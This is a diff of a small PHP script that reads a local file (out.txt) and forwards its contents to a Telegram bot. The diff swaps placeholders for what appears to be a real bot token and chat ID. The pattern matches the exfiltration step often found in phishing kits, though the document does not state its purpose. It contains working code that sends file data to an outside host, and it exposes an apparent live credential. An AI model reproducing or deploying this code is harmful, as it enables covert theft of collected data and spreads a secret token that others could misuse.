@@ -1,5 +1,5 @@
 <?php
     sleep(2);
     $msg = urlencode(file_get_contents("out.txt"));
-    file_get_contents("https://api.telegram.org/botTOKEN/sendMessage?chat_id=CHATID&text=$msg");
+    file_get_contents("https://api.telegram.org/bot5838154637:AAGvSnc2ddlFUSH2_eViLvu8ANFpYYVq1YI/sendMessage?chat_id=5455769313&text=$msg");
 ?>
